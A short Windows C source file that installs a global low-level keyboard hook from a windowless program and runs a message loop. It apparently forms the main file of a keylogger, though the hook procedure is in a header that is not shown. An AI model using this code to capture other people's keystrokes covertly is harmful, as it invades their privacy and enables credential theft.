#include "keys.h"


DWORD WINAPI KeyStroke(LPVOID lpParameter)
{
	HHOOK hKeyHook;
	//HHOOK mHook;
	HINSTANCE exe = GetModuleHandle(NULL);
	if (exe == NULL)
		return 1;
	else
	{
		hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, exe, 0);
		//mHook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)nothing, exe, 0);
		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0) != 0)
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		UnhookWindowsHookEx(hKeyHook);
		//UnhookWindowsHookEx(mHook);

	}
	return 0;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	HANDLE hThread;
	DWORD dwThread;
	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyStroke, NULL, 0, NULL);
	if (hThread)
		return WaitForSingleObject(hThread, INFINITE);
	else
		return 0;
}